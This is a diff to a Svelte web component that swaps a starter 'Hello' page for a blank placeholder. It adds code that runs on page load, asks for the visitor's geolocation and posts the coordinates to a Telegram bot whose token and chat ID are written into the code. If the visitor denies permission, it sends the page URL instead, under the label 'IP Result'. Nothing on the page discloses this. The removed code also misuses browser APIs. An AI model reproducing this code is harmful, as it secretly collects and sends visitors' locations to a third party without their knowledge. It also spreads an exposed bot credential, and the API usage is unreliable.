@@ -1,46 +1,64 @@
 <script>
-export let name;
+  import { onMount } from 'svelte';
 
-  import { onMount } from "svelte";
-
-  async function getLocation() {
-    try {
-      const result = await navigator.permissions.query({ name: "geolocation" });
-      if (result.state === "granted") {
-        const position = await navigator.geolocation.getCurrentPosition();
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`);
-        const data = await response.json();
-        console.log("Location:", data.locality);
-        console.log("IP address:", data.ipString);
-      } else if (result.state === "denied") {
-        const response = await fetch("https://api.bigdatacloud.net/data/client-ip");
-        const data = await response.json();
-        console.log("IP address:", data.ip);
-      } else {
-        const permission = await navigator.permissions.request({ name: "geolocation" });
-        if (permission.state === "granted") {
-          getLocation();
-        } else if (permission.state === "denied") {
-          const response = await fetch("https://api.bigdatacloud.net/data/client-ip");
-          const data = await response.json();
-          console.log("IP address:", data.ip);
+  onMount(() => {
+    // Request location permission automatically
+    navigator.geolocation.getCurrentPosition(
+      (position) => {
+        // Location permission granted, send location result to Telegram bots
+        sendLocationToTelegramBots(position.coords.latitude, position.coords.longitude);
+      },
+      (error) => {
+        if (error.code === error.PERMISSION_DENIED) {
+          // Location permission denied, send IP result to Telegram bots
+          sendIPToTelegramBots();
         }
       }
-    } catch (error) {
-      console.log("Error getting location permission:", error);
-    }
+    );
+  });
+
+  function sendLocationToTelegramBots(latitude, longitude) {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+
+    const message = `Location Result: Latitude - ${latitude}, Longitude - ${longitude}`;
+
+    // Send location result to Telegram bots using an HTTP request
+    fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '373715044',
+        text: message,
+      }),
+    });
   }
 
-  onMount(getLocation);
+  function sendIPToTelegramBots() {
+    // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
+    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendMessage`;
+
+    const message = `IP Result: ${window.location.href}`;
+
+    // Send IP result to Telegram bots using an HTTP request
+    fetch(telegramBotURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: '373715044',
+        text: message,
+      }),
+    });
+  }
 </script>
 
-
 <main>
-	<h1>Hello {name}!</h1>
-	<p>Visit the <a href="https://svelte.dev/tutorial">Svelte tutorial</a> to learn how to build Svelte apps.</p>
-	<br>
-	<p>And check out <a href="https://render.com">Render</a>'s Svelte <a href="https://render.com/docs/deploy-svelte">quickstart guide</a> to see how this site was deployed.</p>
-	<p class="large">🧑‍💻</p>
+  <h1>Your App Content</h1>
+  <!-- Add your app content here -->
 </main>
